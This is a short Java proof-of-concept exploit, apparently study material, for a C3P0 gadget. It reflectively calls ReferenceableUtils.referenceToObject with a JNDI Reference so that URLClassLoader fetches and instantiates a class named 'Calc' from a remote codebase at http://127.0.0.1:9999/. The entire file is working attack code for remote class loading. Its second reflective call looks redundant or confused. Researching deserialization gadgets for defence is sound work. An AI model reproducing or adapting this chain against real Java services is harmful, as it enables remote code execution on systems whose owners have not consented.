package URLClassLoader;


import javax.naming.*;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Hashtable;

// 从 ReferenceableUtils 出发，调用 URLClassLoader 的 EXP
public class RefToURLClassLoader {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NamingException, InstantiationException {
        Class clazz = Class.forName("com.mchange.v2.naming.ReferenceableUtils");
        Reference reference = new Reference("Calc", "Calc","http://127.0.0.1:9999/");
        Method method = clazz.getDeclaredMethod("referenceToObject", Reference.class, Name.class, Context.class, Hashtable.class);
        method.setAccessible(true);
        Object o = method.invoke(clazz, reference, null, null, null);
        Object object = method.invoke(o, null, null, null, null);
    }
}
